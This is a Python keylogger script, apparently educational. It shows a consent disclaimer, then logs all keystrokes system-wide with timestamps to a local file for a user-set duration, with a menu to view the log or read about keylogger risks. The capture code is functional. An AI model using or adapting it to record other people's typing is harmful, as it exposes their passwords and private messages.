import pynput
import time
import os
import sys

# Defines the log file path
log_file_path = "keylogger_log.txt"

# Defines the keylogger function
def keylogger(key):
    # Format the timestamp and key press event
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        event = f"{timestamp} - {key}\n"

    # Writes the event to the log file
    with open(log_file_path, "a") as log_file:
        log_file.write(event)

# Displays the disclaimer and gets user acceptance
def display_disclaimer():
    print("---------------- Keylogger Disclaimer ----------------")
    print("\nThis keylogger program is intended for educational and ethical purposes only.")
    print("Unauthorized use, distribution, or modification of this program is strictly prohibited.")
    print("By using this program, you agree to the following terms and conditions:")
    print("\n1. You will only use this program on devices and systems for which you have explicit permission.")
    print("2. You will not use this program to violate any laws, regulations, or terms of service.")
    print("3. You will not use this program to harm, disrupt, or exploit any devices or systems.")
    print("4. You will not use this program to intercept, collect, or store any sensitive or confidential information.")
    print("5. You will not redistribute or sell this program without the express permission of the author.")
    print("6. The author is not responsible for any damages or losses incurred as a result of using this program.")
    print("7. You will respect the privacy and security of all devices and systems you interact with using this program.")

def main():
    display_disclaimer()

    accept_terms = input("\nDo you accept these terms and conditions? (y/n): ")

    if accept_terms.lower() != 'y':
        print("You must accept the terms and conditions before using this program.")
        sys.exit()

    # Prompts the user to enter the duration for which the keystrokes should be logged
    try:
        log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))
    except ValueError:
        print("Invalid duration. Please enter a valid number.")
        sys.exit()

    # Sets up the keylogger listener
    listener = pynput.keyboard.Listener(on_press=keylogger)
    listener.start()

    # Runs the keylogger for the specified duration
    start_time = time.time()
    end_time = start_time + log_duration

    while time.time() < end_time:
        time.sleep(1)

    # Stops the keylogger listener
    listener.stop()

    # Menu options
    def display_menu():
        print("\nChoose an option:")
        print("1. View the Keylogger log file")
        print("2. Display the log content here")
        print("3. Learn about Keylogger issues")
        print("4. Quit")

    def display_issues():
        print("\nKeylogger Issues and Concerns:")
        print("1. Privacy Concerns: Keyloggers can capture sensitive information, such as passwords and personal messages.")
        print("2. Ethical Issues: Using keyloggers without explicit consent is unethical and illegal.")
        print("3. Security Risks: Malicious keyloggers can be used to steal data or compromise systems.")
        print("4. Legal Consequences: Unauthorized use of keyloggers can lead to legal actions and criminal charges.")
        print("5. Detection: Many anti-virus programs and monitoring software can detect and block keyloggers.")
        print("Always ensure you're using this program responsibly and with permission!")

    # Show the menu for user choice
    display_menu()
    choice = input("Enter your choice (1/2/3/4): ").strip()

    if choice == '1':
        print("\nThe log file has been saved to:", os.path.abspath(log_file_path))
    elif choice == '2':
        with open(log_file_path, "r") as log_file:
            print("\nLog File Content:")
            print(log_file.read())
    elif choice == '3':
        display_issues()
    elif choice == '4':
        print("Thank you for using the program. Goodbye!")
        sys.exit()
    else:
        print("Invalid choice. Please select 1, 2, 3, or 4.")

if __name__ == "__main__":
    main()
